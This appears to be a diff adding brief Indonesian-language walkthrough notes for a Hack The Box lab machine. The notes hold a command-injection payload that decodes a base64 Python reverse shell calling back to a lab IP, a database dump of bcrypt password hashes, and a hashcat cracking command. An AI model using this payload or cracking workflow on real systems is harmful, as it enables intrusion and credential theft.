@@ -1,0 +1,21 @@
+pertama sambungkan vpn dari hack the box menggunakan openvpn lab dari hack the box
+
+kita akan melihat ip apa saja yang tersambung dengan device kita
+
+setelah itu masukan pada burp ;echo${IFS}'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjExOSIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oInNoIikn'|base64${IFS}-d|bash;
+
+grep -r username
+
+psql -U postgres -h 127.0.0.1 -d cozyhosting
+
+  name    |                           password                           | role
+  
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+
+
+hashcat -m 3200 hashes --wordlist /usr/share/wordlists/rockyou.txt --potfile-disable
+
+https://gtfobins.github.io/gtfobins/ssh/
+https://www.revshells.com/
